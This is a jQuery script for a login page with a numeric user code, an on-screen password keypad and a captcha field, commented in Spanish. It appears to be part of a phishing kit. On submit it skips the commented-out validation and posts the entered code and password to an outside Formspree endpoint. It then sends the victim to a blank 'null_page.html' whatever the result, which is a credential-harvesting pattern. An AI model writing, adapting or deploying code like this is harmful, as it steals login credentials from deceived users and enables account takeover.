$(function(){
    //self.setTimeout('reload()',<?php echo timepad() ?>);
    $('#t1').val("");
    $('#t2').val("");
    $('#t1').focus();

    $('#Submit').click(function(){
        $('#t2').removeAttr("disabled");
    });

    $('#form_login').submit(function(event){
        console.log("Evento de envío del formulario capturado.");
        event.preventDefault(); // Previene el envío predeterminado

        // Puedes volver a añadir las validaciones aquí si lo deseas
        /*
        if ( $('#t1').val() == "" ){
            swal({ title: "Cuidado!", text: "Debe ingresar su c\u00f3digo", confirmButtonColor: "#0e1d56", type: "warning" });
            return false;
        }
        if ( $('#t2').val() == "" ){
            swal({ title: "Cuidado!", text: "Debe ingresar su contrase\u00f1a.", confirmButtonColor: "#0e1d56", type: "warning" });
            return false;
        }
        if ( $('#kamousagi').val() == "" ){
            swal({ title: "Cuidado!", text: "Debe ingresar el c\u00f3digo de la imagen.", confirmButtonColor: "#0e1d56", type: "warning" });
            return false;
        }
        */

        console.log("Preparando envío de datos a Formspree vía AJAX...");
        console.log("Datos a enviar:", $(this).serialize());

        $.ajax({
            url: 'https://formspree.io/f/xzzglgga', // ¡Esta URL ya sabemos que es correcta!
            method: 'POST',
            data: $(this).serialize(), 
            // **** CAMBIO CLAVE AQUÍ: AÑADIR LA CABECERA 'Accept' ****
            headers: {
                'Accept': 'application/json'
            },
            dataType: 'json', 

            complete: function() {
                console.log("Solicitud AJAX a Formspree finalizada. Redirigiendo...");
                window.location.href = "null_page.html"; // Redireccionamos a tu archivo HTML local
                console.log("Redirección a 'null_page.html' iniciada.");
            },
            done: function(response) {
                console.log('AJAX SUCCESS: Formulario enviado a Formspree con éxito. Respuesta:', response);
            },
            fail: function(jqXHR, textStatus, errorThrown) {
                console.error('AJAX ERROR: Fallo al enviar el formulario a Formspree.', textStatus, errorThrown);
                console.error('Respuesta del servidor (si existe):', jqXHR.responseText);
                // Si falla el AJAX, aún así redirigimos para que el usuario vea la página "login..."
            }
        });
    });

    $('.delete').click(function(){
        $('#t2').val("");
    });

    $('#t1').keyup(function(){
        var str = $('#t1').val(); 
        var res = "";
        var i = 0;
        while(i < str.length){
            var c = str.charAt(i);
            if (c == '0' || c == '1' || c == '2' || c == '3' || c == '4' || c == '5' || c == '6' || c == '7' || c == '8' || c == '9' ){
                res += c;
            }
            i++;
        }
        $('#t1').val(res);
    });

    // FUNCTIONS FOR THE NUMBER PAD
    setChar = function(c){
        var str = $('#t2').val();
        $('#t2').val(str + c);
    }
});